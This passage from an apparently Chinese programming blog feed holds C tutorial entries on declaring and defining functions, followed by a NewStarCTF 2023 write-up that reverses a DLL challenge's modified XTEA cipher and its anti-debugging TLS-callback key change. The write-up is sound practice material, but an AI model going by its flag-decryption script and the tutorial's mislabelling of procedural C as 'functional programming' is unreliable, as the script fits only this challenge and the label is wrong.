class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们知道,<code>对于一个函数调用,编译器必须知道这个函数的相关信息,才能正确地进行调用</code>.</p><br><p>而提供这些信息的操作就叫做<code>函数声明</code>,现代的C语言中,函数声明有两种方式,分别是<code>函数类型声明</code>和<code>函数定义</code>,需要知道的是,它们都采用<code>函数原型式的风格</code>.具体解释如下:</p><ol><li><p>什么是函数原型</p><p>作为初学,我们无需去了解更加详细的细节,因为这涉及到C语言的发展.</p><p>我们只需要知道,函数原型提供了除了函数体以外的所有信息,也就是<code>int f(int x);</code>所提供给我们的所有信息,包括<code>函数名,函数参数个数,函数参数类型,函数返回值类型</code>.</p><p>编译器根据函数原型,就能够唯一确定一个函数,并且正确地调用这个函数.</p></li><li><p>函数类型声明</p><p>之所以不说函数声明,是因为声明是一个更加笼统的概念,<code>函数类型声明</code>属于其中的一种.</p><p>现在的函数类型声明和函数原型一模一样,就是<code>int f(int x);</code>,即仅仅给出函数头,并在结尾加上<code>;</code></p><p>有了这个信息,就相当于给出了函数原型,编译器就能找到正确的函数.</p></li><li><p>函数定义</p><p>函数定义,可以理解为最为全面的<code>函数声明</code>,他不仅提供了<code>函数的原型</code>,还给出了具体的<code>函数体</code>.</p><p>所谓函数定义,就是这一部分:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数定义比函数类型声明更进一步,完全给出了一个函数,但是问题也很明显,只能使用一次,因为不能重复地给出一个函数体.</p></li></ol><br><p>总结:</p><p>C语言有着很长的发展历史,这里给出的内容,已经是现代C语言的规范了,无论是<code>函数类型声明</code>,还是<code>函数定义</code>,都给出了一个函数最基本的各种信息,也就是都采用<code>函数原型式的风格</code>.</p><p>C99把旧的非原型形式视为过时,因为他们是在C语言还未建立起如此规范的标准之前的写法.</p><p>我们在使用一个函数之前,一定要确保在调用点前有函数的声明存在,无论是仅仅给出声明(函数类型声明)还是给出完整的定义.</p><p>注:以上借鉴自https://www.cnblogs.com/pmer/archive/2011/09/04/2166579.html</p><h2 id="数学函数-参数和返回值的有无问题">数学函数?参数和返回值的有无问题</h2><p>同数学函数不同,数学函数一定有参数(自变量)和函数值(因变量),而C函数更多的是为了实现一个<code>过程</code>,而不是一定要计算出一个结果,甚至,这个过程不需要提供任何的参数作为前提.</p><p>例如,<code>stdlib.h</code>有一个函数<code>int rand();</code>这个函数不需要任何参数,所以参数列表是空的,其功能为生成一个伪随机数,当然不需要任何参数,最终将这个伪随机数作为函数返回值返回.</p><p>再例如,<code>stdlib.h</code>有一个函数<code>void free( void *ptr );</code>这个函数接受一个指针(这里的void *并不是没有参数的意思),用于释放其指向的内存空间,这个函数不需要返回任何值,仅仅释放空间后就直接结束.</p><br><p>如果一个函数不需要参数,或者不需要返回值,则可以使用<code>void</code>类型来说明.</p><p>另外,一个函数可以既没有返回值也不需要参数,则同样可以这样:<code>void func(void);</code></p><br><p><strong>必须注意的是</strong>,参数列表为空,可以写<code>void func(void)</code>,也可以写<code>void func()</code>,往往没有什么影响,但是二者并不是没有区别:</p><p>括号里加void,表明这个函数严格意义地没有参数;</p><p>而如果没有加void,表示这个函数可以有任意多个参数—尽管这些参数不会被处理.</p><br><p>例如,下面的程序用C编译器编译不会报错,能够正常运行(但是使用c++编译器报错!):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;run foo function successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="c和面向过程">C和面向过程</h1><h2 id="什么是面向过程">什么是面向过程</h2><p>面向过程是一种编程思想,其核心是<code>怎么做</code>,专注于完成任务的具体细节.</p><p>一般的面向过程是从上往下步步求精,所以,面向过程的核心是<code>模块化的思想</code>,清楚了程序的流程,就能够实现整个程序.</p><h3 id="c和面向过程">C和面向过程</h3><p>面向过程是一种编程模式,其核心为<code>模块化思想</code>,对于每一个模块的划分,不同的编程语言有着不同的实现.</p><p>对于C语言而言,使用<code>函数</code>来实现模块的分离.将每一个子过程放到一个个的函数中,运行时依次按顺序进行调用即可.亦即一个函数就是一个最小的模块.这也就是所谓的<code>函数式编程</code>.</p><p>不仅如此,我们可以将若干函数封装到同一个源文件中,这些功能相关的函数共同组成一个模块,用于实现一类操作.</p><p>关于面向过程的内容,还有很多,而且还有面向对象,面向切面等等的各种设计模式,碍于能力所限和主题限制,不在此讨论.</p><br><p>本部分分析了函数的各种使用细节,接下来将讲解进一步的使用方法.</p><br><br><p>上一篇:<a href="../2023-10-31-82eafac4349b">C语言教程-12_1-初识函数</a></p><p>下一篇:<a href="../2023-11-01-39a6f8c668c3">C语言教程-12_3-函数的其他用法和特性</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_1-初识函数</title>
      <link href="/2023-10-31-82eafac4349b/"/>
      <url>/2023-10-31-82eafac4349b/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>初步讲解C语言的<code>函数</code>的概念和语法</li></ol><p>前置知识:</p><ol><li>学习过数学,知道什么是数学的函数</li><li>掌握C语言<code>复合语句</code>的概念</li></ol><h1 id="什么是函数">什么是函数</h1><h2 id="数学意义上的函数">数学意义上的函数</h2><p><code>近代定义:</code>给定一个数集<code>A</code>，假设其中的元素为<code>x</code>，对<code>A</code>中的元素x施加对应法则<code>f</code>，记作<code>f(x)</code>，得到另一数集<code>B</code>，假设<code>B</code>中的元素为<code>y</code>，则<code>y</code>与<code>x</code>之间的等量关系可以用<code>y=f(x)</code>表示，函数概念含有三个要素：定义域<code>A</code>、值域<code>B</code>和对应法则<code>f</code>.</p><p>对于各位而言,一定知道函数的概念,简单的讲,就是根据一个特定的值<code>x</code>,对其进行特定的计算过程<code>f</code>,计算出最终的一个结果<code>y</code>,也就是<code>f(x)</code>.</p><p>注:为了方便后续内容的讲解,此后<code>函数值</code>均使用<code>f(x)</code>而不是<code>y</code>表示!</p><p>例如,我们求一个整数的平方,这个运算可以<code>封装</code>成一个函数<code>f(x)=x^2</code>来进行计算,我们传入任意的整数x,最终的结果f(x)仍然是一个整数,其值为x的平方.</p><h2 id="c语言中的函数">C语言中的函数</h2><h3 id="为什么需要函数">为什么需要函数</h3><p>随着程序复杂度的提高,我们不能够将所有的功能/运算过程都堆在一个main函数中,适当地拆分出来,编写为若干子函数,让他们互相配合,共同完成一个庞大的目标.</p><p>也就是所谓的&quot;大化小&quot;,每个函数都负责一个&quot;小目标&quot;,最终将所有函数做的&quot;贡献&quot;合并起来,完成整个程序.</p><p>或者,将一个庞大的操作分成若干的几步小操作,<code>依次</code>进行运算,可以使程序更加清晰!</p><p>这里涉及到<code>面向过程</code>编程思想,后续会讲解到.</p><h3 id="一个c函数的结构">一个C函数的结构</h3><p>C语言的函数(也包括其他所有支持<code>函数</code>的各种高级语言)这一命名是从数学引申来的,其一般意义和数学函数几乎完全等价,关键都是进行<code>某一种运算</code>.</p><p>前面的<code>f(x)=x^2</code>这一函数,使用C语言进行描述,一种写法为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y = x * x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易理解,这个函数的名称为f,其接受一个整数x,在函数中计算x*x的值,赋值给一个整型变量y,最后把y的值返回.我们想要使用这个函数也很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">10</span>,x2;</span><br><span class="line">x2 = f(x); <span class="comment">// x2 的值为100</span></span><br></pre></td></tr></table></figure><p>我们根据这个例子来对应二者的等价关系:</p><table><thead><tr><th>一个函数的各个部分</th><th>数学函数</th><th>C语言的函数</th></tr></thead><tbody><tr><td>f</td><td>函数名</td><td>函数名</td></tr><tr><td>x</td><td>自变量</td><td>函数参数(形式参数)</td></tr><tr><td>f(x)</td><td>函数值</td><td>调用这个函数,return语句返回的值为函数值</td></tr><tr><td>x为整数</td><td>自变量的定义域(x为整数)</td><td>形参x的类型(为int)</td></tr><tr><td>返回的函数值为整数</td><td>因变量的值域(y/f(x)为整数)</td><td>int f(int x)中的第一个int,代表这个函数的返回值类型</td></tr><tr><td>执行的运算</td><td>对应法则f</td><td>函数体{}中的语句构成的代码块,依次执行</td></tr></tbody></table><p>我们可以很容易地看出两者之间的关系,我们将上面的代码完善一下,引入C语言函数的语法↓</p><p>为了直观,概念讲解直接在注释中给出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为了调用printf()这个函数需要引入stdio.h头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的10~19行是一个完整的函数f</span></span><br><span class="line"><span class="comment">// 第一个int为函数的返回值,它指定了函数中return语句最终返回的值的类型</span></span><br><span class="line"><span class="comment">// 返回值后面紧跟函数名,他必须是一个合法的C语言标识符</span></span><br><span class="line"><span class="comment">// 函数名后面的一个圆括号,里面有若干变量的声明,用逗号分隔,这些变量叫做函数形参(形式参数),亦即</span></span><br><span class="line"><span class="comment">// 数学函数的自变量</span></span><br><span class="line"><span class="comment">// 形参声明同样需要给定类型,(int x)代表这个函数需要一个整型的参数,命名为x</span></span><br><span class="line"><span class="comment">// 形参列表-也就是(int x),之后紧跟一个花括号&#123;&#125;,内有若干语句(实际上是一个复合语句),代表函数的实际运算</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="comment">// 和数学函数不同,数学上仅仅是一个对应关系f,指定了计算;</span></span><br><span class="line">    <span class="comment">// 而C函数中可以声明中间变量来辅助计算,这里的y就是一个中间变量,实际上,它用来存储最终计算的结果</span></span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里是最关键的对应关系f的体现,计算x的平方,将结果赋值给y进行临时保存</span></span><br><span class="line">    y = x*x;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// return语句,顾名思义,用于&#x27;返回&#x27;一个值,这个值的类型必须和前面的函数返回值类型相同(或可以进行转换)</span></span><br><span class="line">    <span class="comment">// 将y的值返回,也就是作为这个函数f的函数值返回,一旦执行了return语句,其所在的函数(也就是f())立即结束运行</span></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显然,main()也是一个函数!只不过它十分特殊,后面进行讲解</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2; <span class="comment">// 同样,可以视为中间变量</span></span><br><span class="line">    x2 = f(x); <span class="comment">// 这条语句调用了f()函数,将main中的x作为参数(实际参数)传递给f()</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2); <span class="comment">// 这条语句调用了printf()函数,将一个格式化字符串和x2最为参数(实际参数)传递给printf()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 同样,立即结束main()函数的运行,0作为返回值.</span></span><br><span class="line">    <span class="comment">// 只不过,main函数特殊,其一旦结束,代表着整个程序结束!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释已经写的十分完善,读者在一步步阅读,也在一步步分析上面代码的写法.但是还有两个概念:</p><ol><li><p>函数头</p><p><code>int f(int x)</code>这一部分实际上是一个<code>函数签名</code>,它告诉了我们(更重要的是告诉编译器)这个函数接受<code>1</code>个<code>int类型</code>的参数,并最终<code>返回</code>一个(任何函数都仅且仅能返回一个值)<code>int类型</code>的返回值作为函数调用的结果.</p></li><li><p>函数体</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧跟着函数头的是一个<code>复合语句</code>,在这里称之为<code>函数体</code>,它相当于指定了这个函数的真正运算,其内的各条子语句依次按照逻辑执行,最终(可能)返回一个值.</p></li></ol><h3 id="进一步分析结构">进一步分析结构</h3><p>我们可以看到,一个完整的<code>函数定义</code>(注意不是函数声明!!!)包括两部分:函数头和函数体.</p><p>并且函数头指定了这个函数的相关信息(函数参数的个数及其类型,函数的返回值类型),而且隐含的一点是,它唯一确定了这个函数!</p><p>函数体一旦给出,代表给出了这个函数的定义,这样这个函数就真正意义上的彻底给出!</p><p>函数头中的圆括号(),其中的各个声明,称为形式参数,各个参数使用<code>逗号,</code>隔开,并且严格规定顺序,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">char</span> b)</span>;</span><br></pre></td></tr></table></figure><p>这个函数接受两个参数,第一个参数为int类型,第二个为char类型,返回一个double类型的值.</p><h2 id="注意事项">注意事项</h2><ol><li><p>然而,C语言的函数并不完全等同于数学函数,因为C语言的函数不一定需要参数,甚至,它可能都不需要返回一个值!</p><p>我们后面很快就能看到相关例子!—其实我们已经见到了,那就是main函数!它往往不需要参数!</p></li><li><p>一个函数一旦给出函数体,意味着这个函数实现了定义,在整个程序的任何其他位置,都不能够给出这个函数的第二个定义,即使两个定义一模一样也不行!</p></li><li><p>我们很快就会学习到,有无给出函数体的区别及意义,这涉及到<code>声明</code>和<code>定义</code>的区别.</p><p>并且,C语言中,同一个函数(一个函数名)只能有&quot;一种&quot;函数头—或者准确点:<code>函数签名</code>.</p></li></ol><br><p>本部分讲解了C函数的基本框架语法,接下来会分部分详细讲解函数这一重要组成部分!</p><br><br><p>上一篇:<a href="../2023-10-06-b45ef26d6ec3">C语言教程-11-字符串</a></p><p>下一篇:<a href="../2023-11-01-def693eb5bf8">C语言教程-12_2-深入分析函数和面向过程初识</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-NewStarCTF2023</title>
      <link href="/2023-10-25-dbb77dc4c313/"/>
      <url>/2023-10-25-dbb77dc4c313/</url>
      
        <content type="html"><![CDATA[<p>逆向大部分题都很简单,AK了week1,没什么好记录的,week2和week3有几道题需要记录一下.</p><p>week3和week4没怎么打,看着慢慢补充吧…</p><h1 id="reverse">Reverse</h1><h2 id="ezdll">EzDll</h2><p>先看exe文件,可以看到使用<code>encrypt()</code>函数对flag进行加密,并且从<code>[4*i]</code>猜测是TEA系加密:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182319801.png" alt="image-20231025182319801"></p><p>DLL动态链接库同样可以使用IDA进行分析,在题目提供的dll文件中我们可以找到<code>encrypt()</code>加密函数:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182118379.png" alt="image-20231025182118379"></p><p>可以看到这是一个魔改的XTEA加密,所以传递的第二个参数就是密钥,我们将其提取出来,然后尝试进行解密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">999999999</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">1</span> + delta * <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">3</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">3</span>) ^ (v1 &gt;&gt; <span class="number">4</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">130</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">186</span>, <span class="number">128</span>, <span class="number">200</span>, <span class="number">248</span>, <span class="number">180</span>,</span><br><span class="line">            <span class="number">86</span>, <span class="number">189</span>, <span class="number">179</span>, <span class="number">65</span>, <span class="number">178</span>, <span class="number">141</span>, <span class="number">218</span>, <span class="number">68</span>, <span class="number">14</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">222</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">173</span>, <span class="number">137</span>, <span class="number">149</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">99</span>, <span class="number">33</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">148</span>, <span class="number">17</span>, <span class="number">220</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> *v4p = (<span class="type">uint32_t</span> *) v4;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[] = &#123;</span><br><span class="line">            <span class="number">276</span>, <span class="number">1300</span>, <span class="number">6425</span>, <span class="number">2064</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;v4p[<span class="number">2</span> * i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现乱码,说明哪里有问题.</p><p>再看main函数和函数列表,发现有反调试的部分,例如这个异或判断,就要求必须是不在调试的时候运行,否则<code>IsDebuggerPresent()</code>会返回非0值:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182555465.png" alt="image-20231025182555465"></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182617217.png" alt="image-20231025182617217" style="zoom:50%;" /><p>并且在函数列表发现了Tls相关的函数(别问我是怎么知道这东西的),并且我们知道其常常被用于反调试…</p><p>最终我们在一系列&quot;callback&quot;函数中找到了这个该死的对key进行修改的部分:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025184514929.png" alt="image-20231025184514929"></p><p>这里的数组就是key数组.</p><p>把这里的修改加上就出flag了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">999999999</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">1</span> + delta * <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">3</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">3</span>) ^ (v1 &gt;&gt; <span class="number">4</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">130</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">186</span>, <span class="number">128</span>, <span class="number">200</span>, <span class="number">248</span>, <span class="number">180</span>,</span><br><span class="line">            <span class="number">86</span>, <span class="number">189</span>, <span class="number">179</span>, <span class="number">65</span>, <span class="number">178</span>, <span class="number">141</span>, <span class="number">218</span>, <span class="number">68</span>, <span class="number">14</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">222</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">173</span>, <span class="number">137</span>, <span class="number">149</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">99</span>, <span class="number">33</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">148</span>, <span class="number">17</span>, <span class="number">220</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> *v4p = (<span class="type">uint32_t</span> *) v4;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[] = &#123;</span><br><span class="line">            <span class="number">276</span>, <span class="number">1300</span>, <span class="number">6425</span>, <span class="number">2064</span></span><br><span class="line">    &#125;;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">5</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">4</span> * key[<span class="number">0</span>];</span><br><span class="line">    key[<span class="number">2</span>] = (key[<span class="number">1</span>] &gt;&gt; <span class="number">1</span>) + <span class="number">3</span>;</span><br><span class="line">    key[<span class="number">3</span>] = (key[<span class="number">2</span>] ^ key[<span class="number">1</span>] ^ key[<span class="number">0</span>]) &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;v4p[<span class="number">2</span> * i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025184837381.png" alt="image-20231025184837381" style="zoom:50%;" /><p>结束…</p><h2 